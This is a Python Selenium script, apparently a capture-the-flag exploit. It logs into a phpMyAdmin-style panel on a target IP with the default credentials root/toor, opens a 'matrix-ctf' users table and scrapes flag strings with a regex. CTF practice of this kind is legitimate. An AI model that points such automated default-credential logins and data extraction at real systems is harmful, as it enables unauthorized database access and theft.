#!/usr/bin/python3.6
from selenium import webdriver
import re,sys
options = webdriver.ChromeOptions()
options.add_argument('headless')
options.add_argument('window-size=1920x1080')
driver = webdriver.Chrome("/usr/lib/chromium-browser/chromedriver", chrome_options=options)

ip = sys.argv[1] + ':5001'

try:
    url = 'http://{}/index.php'.format(ip)

    html = driver.get(url)

    username = driver.find_element_by_css_selector('#input_username')
    username.send_keys('root')
    password = driver.find_element_by_css_selector('#input_password')
    password.send_keys('toor')
    button = driver.find_element_by_css_selector('#input_go')
    button.click()

    driver.get('http://{}/sql.php?server=1&db=matrix-ctf&table=users&pos=0'.format(ip))

    button_li = '//*[@id="page_content"]/div[2]/table[1]/tbody/tr/td[11]/form/select/option'
    button = driver.find_elements_by_xpath(button_li)
    button[1].click()

    html = driver.page_source
    print(re.findall('[A-Z0-9]{31}=', str(html)), flush=True)
    driver.close()
except:
    driver.close()


